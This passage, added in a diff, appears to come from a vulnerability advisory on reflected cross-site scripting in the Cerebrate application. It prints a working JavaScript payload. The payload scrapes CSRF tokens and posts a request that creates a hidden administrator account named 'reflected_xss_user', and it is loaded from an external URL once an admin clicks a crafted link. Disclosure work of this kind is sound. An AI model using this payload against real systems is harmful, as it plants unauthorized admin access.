@@ -1,0 +1,23 @@
+The application is vulnerable to reflected cross site scripting in the “/localTools/action/1/modifySettingAction” section.
+To illustrate the attack scenario an adversary created a malicious script:
+u = '/users/add'; $.get(u, function(d) {
+r = /_Token\[fields\]".*?value="([^"]+)"/g; t = r.exec(d)[1];
+r = /_csrfToken.*?value="([^"]+)"/g;
+c = r.exec(d)[1];
+$.post(u, {
+_csrfToken: c,
+'_Token[fields]': t,
+individual_id: 1,
+username: 'reflected_xss_user', organisation_id: 1,
+password: '123qweASD!@#', confirm_password: '123qweASD!@#', role_id: 1,
+disabled: 0,
+'_Token[unlocked]': ''
+}); });
+   This script was accessible under the following URL: https://zigrin.com/xss-cerebrate-125719276512.js Before executing the attack there were only 8 users on Cerebrate instance:
+Figure 6 - 8 Cerebrate users
+
+
+JavaScript is executed when the adversary convinces a Cerebrate’s administrator to click on the following URL:
+Executed JavaScript code from the adversary’s server results in a creation of a new administrator (reflected_xss_user) on the Cerebrate application:
+Figure 7 - reflected_xss_user created on the Cerebrate application
+Note: At least one MISP connection has to be created in Cerebrate in order to exploit this vulnerability.
